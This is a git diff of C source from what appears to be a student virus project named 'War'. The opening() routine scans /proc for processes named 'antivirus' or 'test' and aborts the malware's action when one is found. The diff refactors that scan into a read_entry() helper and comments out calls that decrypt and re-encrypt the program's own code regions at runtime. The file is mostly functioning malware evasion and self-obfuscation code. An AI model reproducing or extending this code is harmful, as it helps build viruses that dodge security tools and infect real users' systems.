@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 15:25:47 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/10 23:09:11 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,24 +16,54 @@
   Opening() iterate thought every entry in /proc in order to found antivirus proccess
   Look at needle variable to remove or add proccess you want to find.
   if the process is found then War abort as soon as possible.
+  i'm deeply sorry about how ugly opening() is :(
 */
+
+__INLINE__ bool read_entry(int fd)
+{
+	char	prog[PROG_INFO] = {0};
+	char	needle[PROG_ENTRY][16] = {"antivirus", "test"};
+
+	if (_read(fd, prog, PROG_INFO) > 0)
+	{
+		for (register int count = 0 ; count < PROG_ENTRY ; count++)
+		{
+			int count2 = 6;
+			while ((prog[count2] == ' ' || prog[count2] == '\t') && prog[count2] != '\0')
+				count2++;
+			if (_strncmp(needle[count], &prog[count2], _strlen(needle[count])) == 0)
+			{
+
+				#ifdef DEBUG
+				char c = '\n';
+				char tutu[] = "\tproccess :\t";
+				_log(tutu, _strlen(tutu));
+				_log(&prog[count2], _strlen(&prog[count2]));
+				_log(&c, 1);
+				#endif
+				return (true);
+			}
+		}
+	}
+	return (false);
+}
 
 void	opening(t_data *data)
 {
 
 #ifdef DEBUG
-	char de[] = "opening\t0\n";
-	data->context == true ?	de[8] = 49 : 0;
+	char de[] = "opening\t\t0\n";
+	data->context == true ?	de[9] = 49 : 0;
 	_log(de, _strlen(de));
 #endif
+
+	/* revert_one(&data->key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */
 
 	int				fd[3];
 	int				limit;
 	char			buf[BUFF_SIZE] = {0};
 	char			target[9] = "/status";
 	char			path[PATH_MAX] = "/proc/";
-	char			prog[PROG_INFO] = {0};
-	char			needle[PROG_ENTRY][16] = {"antivirus", "test"};
 	linux_dirent64	*curr = NULL;
 
 	data->context = false;
@@ -46,55 +76,29 @@ void	opening(t_data *data)
 		{
 			curr = (struct linux_dirent64 *)(buf + i);
 			int len = _strlen(curr->d_name);
-			if (check_name(curr->d_name, len) == true)
+			if (len > 0 && check_name(curr->d_name, len) == true)
 			{
 				_memcpy(path + 6, curr->d_name, len);
 				path[6 + len] = '\0';
 				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
-				{
-					_close(fd[0]);
-					goto next;
-				}
+					continue ;
 				_memcpy(path + (6 + len), target, 9);
 				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
-				{
-					_close(fd[1]);
+					continue ;
+				if (read_entry(fd[2]) == true)
 					goto next;
-				}
-
-				if (_read(fd[2], prog, PROG_INFO) > 0)
-				{
-					for (register int j = 0 ; j < PROG_ENTRY ; j++)
-					{
-						int k = 6;
-						while ((prog[k] == ' ' || prog[k] == '\t') && prog[k] != '\0')
-							k++;
-						if (_strncmp(needle[j], &prog[k], _strlen(needle[j])) == 0)
-						{
-#ifdef DEBUG
-							char tutu[] = "proccess :\t";
-							_log(tutu, _strlen(tutu));
-							_log(&prog[k], _strlen(&prog[k]));
-							_log(&de[9], 1);
-#endif
-
-							_close(fd[2]);
-							_close(fd[1]);
-							goto next;
-						}
-					}
-				}
 				_close(fd[2]);
 				_close(fd[1]);
 			}
 		}
 	}
-	_close(fd[0]);
 	data->context = true;
 
 next:
-
-	update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening);
-	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
+	_close(fd[0]);
+	_close(fd[1]);
+	_close(fd[2]);
+	/* update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening); */
+	/* revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war); */
 	war(data);
 }
